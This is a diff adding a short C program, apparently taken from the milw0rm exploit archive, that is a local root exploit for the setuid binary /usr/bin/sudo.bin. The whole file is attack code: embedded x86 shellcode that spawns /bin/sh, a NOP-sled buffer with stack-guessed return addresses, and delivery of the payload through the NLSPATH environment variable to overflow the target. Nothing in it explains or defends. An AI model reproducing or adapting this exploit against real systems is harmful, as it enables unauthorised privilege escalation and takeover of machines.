@@ -1,0 +1,62 @@
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <sys/stat.h>
+
+#define PATH_SUDO "/usr/bin/sudo.bin"
+#define BUFFER_SIZE 1024
+#define DEFAULT_OFFSET 50
+
+u_long get_esp()
+{
+  __asm__("movl %esp, %eax");
+
+}
+
+main(int argc, char **argv)
+{
+  u_char execshell[] =
+   "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
+   "\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
+   "\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
+
+   char *buff = NULL;
+   unsigned long *addr_ptr = NULL;
+   char *ptr = NULL;
+
+   int i;
+   int ofs = DEFAULT_OFFSET;
+
+   buff = malloc(4096);
+   if(!buff)
+   {
+      printf("can't allocate memory\n");
+      exit(0);
+   }
+   ptr = buff;
+
+   /* fill start of buffer with nops */
+
+   memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell));
+   ptr += BUFFER_SIZE-strlen(execshell);
+
+   /* stick asm code into the buffer */
+
+   for(i=0;i < strlen(execshell);i++)
+      *(ptr++) = execshell[i];
+
+   addr_ptr = (long *)ptr;
+   for(i=0;i < (8/4);i++)
+      *(addr_ptr++) = get_esp() + ofs;
+   ptr = (char *)addr_ptr;
+   *ptr = 0;
+
+   printf("SUDO.BIN exploit coded by _PHANTOM_ 1997\n");
+   setenv("NLSPATH",buff,1);
+   execl(PATH_SUDO, "sudo.bin","bash", NULL);
+}
+
+
+
+// milw0rm.com [1996-02-13]
